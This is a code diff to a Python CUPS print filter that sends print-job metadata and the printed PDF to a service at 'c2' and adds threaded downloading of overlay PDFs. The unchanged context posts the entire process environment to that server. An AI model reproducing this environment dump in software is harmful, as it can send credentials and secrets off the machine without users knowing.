@@ -15,6 +15,8 @@ import threading
 import subprocess
 import io
 import os
+import urllib
+import dateutil.parser
 
 
 def eprint(*args, **kwargs):
@@ -67,18 +69,66 @@ class MetaUploader(threading.Thread):
 
     def run(self):
         job_data = {'id': self.cups_id, 'user': self.cups_user, 'title': self.cups_title, 'copies': self.cups_copies,
-                    'options': self.cups_options, 'timestamp': datetime.datetime.now().isoformat(),
+                    'options': self.cups_options, 'timestamp': datetime.datetime.now().timestamp(),
                     'environment': dict(os.environ)}
         bpc_debug("Uploading Metadata")
         response = requests.post(C2_METADATA_URL, json=job_data)
         json_response = response.json()
         bpc_debug("Uploaded Metadata - Response:", json_response)
         self._upload_id = json_response['upload_id']
-        self._pages = json_response['pages']
+        self._upload_file = json_response['upload_file']
+        overlays = {}
+        file_downloader = {}
+        for each in json_response['overlays']:
+            filename = each['filename']
+            key = each["key"]
+            url = urllib.parse.urljoin(C2_API_URL, each['url'])
+            updated_at = datetime.datetime.fromtimestamp(each['updated_at'])
+            if file_downloader.get(url) is not None:
+                downloader = file_downloader[url]
+            else:
+                downloader = FileDownloader(filename, key, url, updated_at)
+                downloader.start()
+                file_downloader[url] = downloader
+            overlays[int(each['number'])] = {'filename': filename,
+                                             'url': url,
+                                             'updated_at': updated_at,
+                                             'downloader': file_downloader[url]
+                                             }
+
+        bpc_debug("Uploaded Metadata - Done:", overlays)
 
     def upload_id(self):
         self.join()
         return self._upload_id
+
+    def upload_file(self):
+        self.join()
+        return self._upload_file
+
+
+class FileDownloader(threading.Thread):
+    def __init__(self, filename, key, url, updated_at):
+        threading.Thread.__init__(self)
+        self._filename = filename
+        self._key = key
+        self._path = (OVERLAY_PDF_DIR + '/%s.pdf') % key
+        self._url = url
+        self._updated_at = updated_at
+        self._bytes = None
+
+    def run(self):
+        bpc_debug("FileDownloader:", self._path, self._url, self._updated_at)
+        if not os.path.isfile(self._path) or (
+                    datetime.datetime.fromtimestamp(os.path.getmtime(self._path)) < self._updated_at):
+            bpc_debug("File does not exist - downloading")
+            with open(self._path, 'wb') as file:
+                file.write(requests.get(self._url).content)
+        bpc_debug("FileDownloader:", "Done")
+
+    def path(self):
+        self.join()
+        return self._path
 
 
 def ps_to_pdf(pdf_input_bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
@@ -176,6 +226,8 @@ C2_API_URL = 'http://c2:8080/bpc/api-v1'
 C2_METADATA_URL = C2_API_URL + '/metadata'
 C2_UPLOAD_URL = C2_API_URL + '/file/%s'
 
+OVERLAY_PDF_DIR = '/bpc/PDFs'
+
 cups_id = sys.argv[1]
 cups_user = sys.argv[2]
 cups_title = sys.argv[3]
@@ -190,7 +242,8 @@ meta_uploader.start()
 # pdf_input_data = ps_to_pdf(ps_in_bytes, cups_id, cups_user, cups_title, cups_copies, cups_options)
 pdf_in_bytes = ps_2_pdf(ps_in_bytes, cups_id, cups_user, cups_title, cups_copies, cups_options)
 
-spawn_daemon(upload_bytes, pdf_in_bytes, meta_uploader.upload_id(), 'print.pdf', 'application/pdf')
+if meta_uploader.upload_file():
+    spawn_daemon(upload_bytes, pdf_in_bytes, meta_uploader.upload_id(), 'print.pdf', 'application/pdf')
 
 pdf_out_bytes = overlay_pdf(pdf_in_bytes)
 
